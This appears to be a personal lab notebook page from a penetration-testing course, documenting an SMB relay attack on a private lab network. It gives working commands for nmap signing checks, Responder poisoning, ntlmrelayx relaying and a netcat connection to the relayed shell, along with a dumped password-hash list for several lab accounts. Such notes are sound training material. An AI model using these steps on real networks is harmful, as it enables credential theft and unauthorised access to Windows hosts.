SMB Relay Attacks Lab

Sunday, October 1, 2023

7:48 PM

 

-   nmap \--script=smb2-security-mode.nse -p445 10.0.2.0/24 -Pn

    -   Add -Pn if unable to ping

![](006_SMB_Relay_Attacks_Lab_000.png){width="6.0in" height="6.427083333333333in"}

 

 

Add targets with signing disable or enable but not required to text file

![](006_SMB_Relay_Attacks_Lab_001.png){width="16.625in" height="4.4375in"}

 

Switch off SMB and HTTP in Responder.conf file /etc/responder/Responder.conf

![](006_SMB_Relay_Attacks_Lab_002.png){width="12.385416666666666in" height="4.302083333333333in"}

 

Run Responder sudo responder -I eth0 -dwPv

![](006_SMB_Relay_Attacks_Lab_003.png){width="10.041666666666666in" height="6.875in"}

 

Run ntlmrelayx.py ntlmrelayx.py -tf targets.txt -smb2support

![](006_SMB_Relay_Attacks_Lab_004.png){width="13.822916666666666in" height="4.802083333333333in"}

 

Example pointing target machine at attacker machine [\\\\10.0.2.15](file://10.0.2.15) in file explorer

![](006_SMB_Relay_Attacks_Lab_005.png){width="11.166666666666666in" height="4.114583333333333in"}

 

You can see above 10.0.2.9 SUCCEED and Hash dump

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
>
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
>
> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
>
> WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bb5020953fd3b0b0501ba1c3e2a391a0:::
>
> peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
>
>  

Run ntlmrelayx again with -I and redo sample connection

Connect target machine again to attacker machine and run nc 127.0.0.1 11000 (11001, 11002)

 

![](006_SMB_Relay_Attacks_Lab_006.png){width="12.854166666666666in" height="4.875in"}

 

Connect in with netcat

![](006_SMB_Relay_Attacks_Lab_007.png){width="7.21875in" height="1.1458333333333333in"}

 

Playing with the commands (remember help for commands)

![](006_SMB_Relay_Attacks_Lab_008.png){width="9.604166666666666in" height="5.625in"}

 

 

Example of running a command with ntlmrelayx

![](006_SMB_Relay_Attacks_Lab_009.png){width="11.072916666666666in" height="6.6875in"}

 

 

 
